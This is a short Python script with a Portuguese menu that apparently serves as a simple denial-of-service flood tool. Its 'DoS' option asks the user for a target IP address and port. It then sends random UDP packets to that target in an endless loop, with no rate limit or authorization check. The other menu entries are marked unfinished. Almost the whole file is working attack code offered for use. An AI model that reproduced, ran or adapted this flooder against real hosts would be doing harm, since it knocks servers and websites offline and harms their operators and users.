import base64 
import colorama as xaex
import socket 
import time 
import os 
os.system('clear' if os.name != 'nt' else 'cls')
xaex.init(autoreset=True, convert=True)
rax = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
mov = print


b = f"""
{xaex.Fore.MAGENTA}██████╗ ███████╗██╗   ██╗███████╗ █████╗ {xaex.Fore.RED}      █████╗ ████████╗███████╗███╗   ██╗ █████╗ 
{xaex.Fore.MAGENTA}██╔══██╗██╔════╝██║   ██║██╔════╝██╔══██╗ {xaex.Fore.RED}    ██╔══██╗╚══██╔══╝██╔════╝████╗  ██║██╔══██╗
{xaex.Fore.MAGENTA}██║  ██║█████╗  ██║   ██║███████╗███████║ {xaex.Fore.RED}    ███████║   ██║   █████╗  ██╔██╗ ██║███████║
{xaex.Fore.MAGENTA}██║  ██║██╔══╝  ██║   ██║╚════██║██╔══██║ {xaex.Fore.RED}    ██╔══██║   ██║   ██╔══╝  ██║╚██╗██║██╔══██║
{xaex.Fore.MAGENTA}██████╔╝███████╗╚██████╔╝███████║██║  ██║  {xaex.Fore.RED}   ██║  ██║   ██║   ███████╗██║ ╚████║██║  ██║
{xaex.Fore.MAGENTA}╚═════╝ ╚══════╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝ {xaex.Fore.RED}    ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═══╝╚═╝  ╚═╝
                                                                                        """
print(b)
mov(f"{xaex.Fore.CYAN}          [01]--> DoS")
mov(f"{xaex.Fore.GREEN}         [02]--> Connect [NÃO PRONTO]")
mov(f"{xaex.Fore.BLUE}          [03]--> Database [NÃO PRONTO]")
mov(f"{xaex.Fore.LIGHTYELLOW_EX}            [04]--> Exit")
import random
print(f' {xaex.Fore.BLUE}Oque de{xaex.Fore.LIGHTBLUE_EX}sejas, mortal?')
_xaq_ = int(input(""))
def aeos_type(t):
    if t == 'd':
        return '[DEBUG]'
    elif t == 'i':
        return '[INFO]'
    elif t == 'si':
        return '[SYSINFO]'
    elif t == 'm':
        return '[SYSMETHOD]'
    elif t == 'cr':
        return '[CRIT ERROR]'
    

def kax(rdi, rsi):
    print(aeos_type('si'), " ?? ", "Object Flaw --> Testing Remote..")
    time.sleep(1)
    print()
    rdx = (rdi, rsi)
    print(aeos_type('d'), " ?? ", "Remote Flaw --> Remote setup, Pack Sending..")
    time.sleep(2)
    print()
    try:
        while True:
            vax = random.randint(0, 956)
            try:
                rax.sendto(f'{vax}'.encode(), rdx)
            except Exception:
                print(f'{xaex.Fore.RED}ERRO, talvez o servidor/site caiu')
            print(f'{xaex.Fore.LIGHTGREEN_EX}[{vax}]', " ?? ", "PACOTE ENVIADO")
    except Exception as e:
        print(aeos_type('cr'), " ?? ", e)

if _xaq_ == 1:
    cax = input('                                        <-- IP --> ')
    vax = int(input('                                        <-- PORTA --> '))
    kax(cax, vax)
elif _xaq_ == 4:
    quit(1)
else:
    print('Opção invalida! \n -- Opções: 1 OU 4')
    time.sleep(3)
    quit(1)